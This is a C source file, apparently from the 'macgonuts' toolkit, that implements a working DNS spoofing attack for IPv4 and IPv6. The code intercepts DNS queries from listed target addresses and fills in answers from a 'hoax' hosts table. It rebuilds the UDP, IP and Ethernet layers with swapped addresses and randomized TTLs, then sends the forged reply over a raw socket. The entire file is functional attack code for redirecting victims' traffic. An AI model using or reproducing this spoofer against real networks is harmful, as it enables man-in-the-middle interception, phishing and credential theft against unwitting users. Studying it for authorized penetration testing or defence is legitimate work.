/*
 * Copyright (c) 2023, Rafael Santiago
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree.
 */
#include <macgonuts_dnsspoof.h>
#include <macgonuts_ethfrm.h>
#include <macgonuts_ip4hdr.h>
#include <macgonuts_ip6hdr.h>
#include <macgonuts_udphdr.h>
#include <macgonuts_dnshdr.h>
#include <macgonuts_dnsconv.h>
#include <macgonuts_iplist.h>
#include <macgonuts_etc_hoax.h>
#include <macgonuts_socket.h>
#include <macgonuts_status_info.h>

#define ETH_FRM_SIZE 14

static int do_dnsspoof4(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size);

static int do_dnsspoof6(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size);

static uint8_t get_random_ttl(void);

static int do_dnsspoof_layer4to7(struct macgonuts_udphdr_ctx *udphdr,
                                 struct macgonuts_dnshdr_ctx *dnshdr,
                                 macgonuts_etc_hoax_handle *etc_hoax,
                                 const uint32_t dns_answer_ttl,
                                 uint8_t *data4, const size_t data4_size,
                                 const int ip_version);

int macgonuts_dnsspoof(const macgonuts_socket_t rsk, struct macgonuts_spoof_layers_ctx *spf_layers,
                       macgonuts_iplist_handle *iplist_handle,
                       macgonuts_etc_hoax_handle *etc_hoax_handle,
                       const uint32_t dns_answer_ttl,
                       const unsigned char *ethfrm, const size_t ethfrm_size) {
    int (*do_dnsspoof)(macgonuts_socket_t, macgonuts_etc_hoax_handle *, const uint32_t,
                       const unsigned char *, const size_t) = NULL;
    uint8_t *in_addr = NULL;
    size_t in_addr_size = 0;
    uint16_t ether_type = 0;
    int err = EXIT_FAILURE;

    assert(rsk > -1
           && spf_layers != NULL
           && ethfrm != NULL
           && ethfrm_size > 0);

    if (!macgonuts_is_dnsreq(ethfrm, ethfrm_size)) {
        return EPROTOTYPE;
    }

    ether_type = (uint16_t) ethfrm[12] << 8 | (uint16_t) ethfrm[13];

    switch (ether_type) {
        case MACGONUTS_ETHER_TYPE_IP4:
            do_dnsspoof = do_dnsspoof4;
            in_addr = (uint8_t *)&ethfrm[26];
            in_addr_size = 4;
            break;

        case MACGONUTS_ETHER_TYPE_IP6:
            do_dnsspoof = do_dnsspoof6;
            in_addr = (uint8_t *)&ethfrm[22];
            in_addr_size = 16;
            break;

        default:
            // INFO(Rafael): It should never happen in normal conditions.
            return EAFNOSUPPORT;
    }

    assert(do_dnsspoof != NULL);

    if (!macgonuts_iplist_has(iplist_handle, in_addr, in_addr_size)) {
        return EADDRNOTAVAIL;
    }

    err = do_dnsspoof(rsk, etc_hoax_handle, dns_answer_ttl, ethfrm, ethfrm_size);

    return err;
}

static int do_dnsspoof4(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size) {
    struct macgonuts_ethfrm_ctx eth;
    struct macgonuts_ip4hdr_ctx ip4;
    struct macgonuts_ip4_pseudo_hdr_ctx ip4p;
    struct macgonuts_udphdr_ctx udp;
    struct macgonuts_dnshdr_ctx dns;
    int err = EXIT_FAILURE;
    unsigned char *spoofed_answer = NULL;
    size_t spoofed_answer_size = 0;
    uint8_t temp_mac[6] = { 0 };
    uint32_t temp_addr = 0;

    memset(&eth, 0, sizeof(eth));
    memset(&ip4, 0, sizeof(ip4));
    memset(&ip4p, 0, sizeof(ip4p));
    memset(&udp, 0, sizeof(udp));
    memset(&dns, 0, sizeof(dns));

    err = macgonuts_read_ethernet_frm(&eth, ethfrm, ethfrm_size);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    err = macgonuts_read_ip4_pkt(&ip4, eth.data, eth.data_size);
    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    err = do_dnsspoof_layer4to7(&udp, &dns, etc_hoax, dns_answer_ttl, ip4.payload, ip4.payload_size, 4);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof4_epilogue;
    }

    ip4p.dest_addr[0] = (ip4.src_addr >> 24) & 0xFF;
    ip4p.dest_addr[1] = (ip4.src_addr >> 16) & 0xFF;
    ip4p.dest_addr[2] = (ip4.src_addr >>  8) & 0xFF;
    ip4p.dest_addr[3] =  ip4.src_addr & 0xFF;

    ip4p.src_addr[0] = (ip4.dest_addr >> 24) & 0xFF;
    ip4p.src_addr[1] = (ip4.dest_addr >> 16) & 0xFF;
    ip4p.src_addr[2] = (ip4.dest_addr >>  8) & 0xFF;
    ip4p.src_addr[3] =  ip4.dest_addr & 0xFF;

    ip4p.zprotolen[1] = 0x11;
    ip4p.zprotolen[2] = (udp.len >> 8) & 0xFF;
    ip4p.zprotolen[3] = udp.len & 0xFF;

    assert(ip4.payload != NULL);
    free(ip4.payload);

    ip4.id++;
    ip4.ttl = get_random_ttl();
    ip4.tlen = udp.payload_size + (ip4.ihl<<2) + 8;

    temp_addr = ip4.src_addr;
    ip4.src_addr = ip4.dest_addr;
    ip4.dest_addr = temp_addr;

    ip4.payload = macgonuts_make_udp_pkt(&udp, &ip4.payload_size, &ip4p, sizeof(ip4p));
    if (ip4.payload == NULL) {
        err = ENOMEM;
        goto do_dnsspoof4_epilogue;
    }

    assert(eth.data != NULL);
    free(eth.data);
    ip4.chsum = 0;
    eth.data = macgonuts_make_ip4_pkt(&ip4, &eth.data_size, 1);
    if (eth.data == NULL) {
        err = ENOMEM;
        goto do_dnsspoof4_epilogue;
    }

    memcpy(&temp_mac[0], &eth.dest_hw_addr[0], sizeof(temp_mac));
    memcpy(&eth.dest_hw_addr[0], &eth.src_hw_addr[0], sizeof(eth.dest_hw_addr));
    memcpy(&eth.src_hw_addr[0], &temp_mac[0], sizeof(eth.src_hw_addr));

    spoofed_answer = macgonuts_make_ethernet_frm(&eth, &spoofed_answer_size);
    if (spoofed_answer == NULL) {
        err = ENOMEM;
        goto do_dnsspoof4_epilogue;
    }

    err = (macgonuts_sendpkt(rsk,
                             spoofed_answer,
                             spoofed_answer_size) == spoofed_answer_size) ? EXIT_SUCCESS : EXIT_FAILURE;

do_dnsspoof4_epilogue:

    if (dns.qd != NULL || dns.an != NULL) {
        macgonuts_release_dnshdr(&dns);
    }

    if (udp.payload != NULL) {
        macgonuts_release_udphdr(&udp);
    }

    if (ip4.payload != NULL) {
        macgonuts_release_ip4hdr(&ip4);
    }

    if (eth.data != NULL) {
        macgonuts_release_ethfrm(&eth);
    }

    if (spoofed_answer != NULL) {
        free(spoofed_answer);
    }

    return err;
}

static int do_dnsspoof6(macgonuts_socket_t rsk, macgonuts_etc_hoax_handle *etc_hoax,
                        const uint32_t dns_answer_ttl, const unsigned char *ethfrm, const size_t ethfrm_size) {
    struct macgonuts_ethfrm_ctx eth;
    struct macgonuts_ip6hdr_ctx ip6;
    struct macgonuts_ip6_pseudo_hdr_ctx ip6p;
    struct macgonuts_udphdr_ctx udp;
    struct macgonuts_dnshdr_ctx dns;
    size_t payload_size = 0;
    unsigned char *spoofed_answer = NULL;
    size_t spoofed_answer_size = 0;
    uint8_t temp_mac[6] = { 0 };
    int err = EXIT_FAILURE;

    memset(&eth, 0, sizeof(eth));
    memset(&ip6, 0, sizeof(ip6));
    memset(&ip6p, 0, sizeof(ip6p));
    memset(&udp, 0, sizeof(udp));
    memset(&dns, 0, sizeof(dns));

    err = macgonuts_read_ethernet_frm(&eth, ethfrm, ethfrm_size);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    err = macgonuts_read_ip6_pkt(&ip6, eth.data, eth.data_size);
    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    err = do_dnsspoof_layer4to7(&udp, &dns, etc_hoax, dns_answer_ttl, ip6.payload, ip6.payload_length, 6);

    if (err != EXIT_SUCCESS) {
        goto do_dnsspoof6_epilogue;
    }

    memcpy(&ip6p.src_addr[0], &ip6.dest_addr[0], sizeof(ip6p.src_addr));
    memcpy(&ip6p.dest_addr[0], &ip6.src_addr[0], sizeof(ip6p.dest_addr));
    ip6p.upper_layer_pkt_len[2] = (udp.len >> 8) & 0xFF;
    ip6p.upper_layer_pkt_len[3] = udp.len & 0xFF;
    ip6p.next_header[3] = ip6.next_header;

    assert(ip6.payload != NULL);

    free(ip6.payload);
    ip6.payload = macgonuts_make_udp_pkt(&udp, &payload_size, &ip6p, sizeof(ip6p));
    if (ip6.payload == NULL) {
        err = ENOMEM;
        goto do_dnsspoof6_epilogue;
    }
    ip6.hop_limit = get_random_ttl();
    ip6.payload_length = payload_size & 0xFFFF;

    assert(eth.data != NULL);

    free(eth.data);
    memcpy(&ip6.src_addr[0], &ip6p.src_addr[0], sizeof(ip6.src_addr));
    memcpy(&ip6.dest_addr[0], &ip6p.dest_addr[0], sizeof(ip6.dest_addr));
    eth.data = macgonuts_make_ip6_pkt(&ip6, &eth.data_size);
    if (eth.data == NULL) {
        err = ENOMEM;
        goto do_dnsspoof6_epilogue;
    }

    memcpy(&temp_mac[0], &eth.dest_hw_addr[0], sizeof(temp_mac));
    memcpy(&eth.dest_hw_addr[0], &eth.src_hw_addr[0], sizeof(eth.dest_hw_addr));
    memcpy(&eth.src_hw_addr[0], &temp_mac[0], sizeof(eth.src_hw_addr));

    spoofed_answer = macgonuts_make_ethernet_frm(&eth, &spoofed_answer_size);
        if (spoofed_answer == NULL) {
        err = ENOMEM;
        goto do_dnsspoof6_epilogue;
    }

    err = (macgonuts_sendpkt(rsk,
                             spoofed_answer,
                             spoofed_answer_size) == spoofed_answer_size) ? EXIT_SUCCESS : EXIT_FAILURE;

do_dnsspoof6_epilogue:

    if (dns.qd != NULL || dns.an != NULL) {
        macgonuts_release_dnshdr(&dns);
    }

    if (udp.payload != NULL) {
        macgonuts_release_udphdr(&udp);
    }

    if (ip6.payload != NULL) {
        macgonuts_release_ip6hdr(&ip6);
    }

    if (eth.data != NULL) {
        macgonuts_release_ethfrm(&eth);
    }

    if (spoofed_answer != NULL) {
        free(spoofed_answer);
    }

    return err;
}

static int do_dnsspoof_layer4to7(struct macgonuts_udphdr_ctx *udphdr,
                                 struct macgonuts_dnshdr_ctx *dnshdr,
                                 macgonuts_etc_hoax_handle *etc_hoax,
                                 const uint32_t dns_answer_ttl,
                                 uint8_t *data4, const size_t data4_size,
                                 const int ip_version) {
    int err = EADDRNOTAVAIL;
    struct macgonuts_dns_rr_hdr_ctx *qp = NULL;
    uint8_t in_addr[16] = { 0 };
    size_t in_addr_size = 0;
    uint16_t temp_port = 0;
    const size_t kWantedInAddrSize[2] = { 16, 4 };

    err = macgonuts_read_udp_pkt(udphdr, data4, data4_size);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    err = macgonuts_read_dns_pkt(dnshdr, udphdr->payload, udphdr->payload_size);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    if (dnshdr->qdcount == 0 || dnshdr->qd == NULL) {
        return EINVAL;
    }

    err = ENOENT;
    for (qp = dnshdr->qd; qp != NULL && err != EXIT_SUCCESS; qp = qp->next) {
        err = macgonuts_gethostbyname(in_addr, kWantedInAddrSize[(ip_version == 4)], &in_addr_size, etc_hoax,
                                      (char *)qp->name, qp->name_size);
    }

    if (err != EXIT_SUCCESS) {
        return EADDRNOTAVAIL;
    }

    err =  macgonuts_add_dns_answer(dnshdr, in_addr, in_addr_size, dns_answer_ttl);
    if (err != EXIT_SUCCESS) {
        return err;
    }

    assert(udphdr->payload != NULL);
    free(udphdr->payload);

    dnshdr->qr = 1;
    dnshdr->rd = 0;
    dnshdr->ra = 0;
    dnshdr->aa = 0;
    dnshdr->tc = 0;
    dnshdr->ra = 0;
    dnshdr->rcode = 0;
    dnshdr->arcount = 0;

    udphdr->payload = macgonuts_make_dns_pkt(dnshdr, &udphdr->payload_size);

    if (udphdr->payload == NULL) {
        err = ENOMEM;
    } else {
        temp_port = udphdr->dest_port;
        udphdr->len = 8 + udphdr->payload_size;
        udphdr->dest_port = udphdr->src_port;
        udphdr->src_port = temp_port;
    }

    return err;
}

static uint8_t get_random_ttl(void) {
    uint8_t ttl = 0;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd == -1) {
        return 42;
    }
    while (read(fd, &ttl, sizeof(ttl)) != sizeof(ttl)
        || ttl == 0
        || ttl == 255) {
        usleep(10);
    }
    close(fd);
    return ttl;
}

#undef ETH_FRM_SIZE
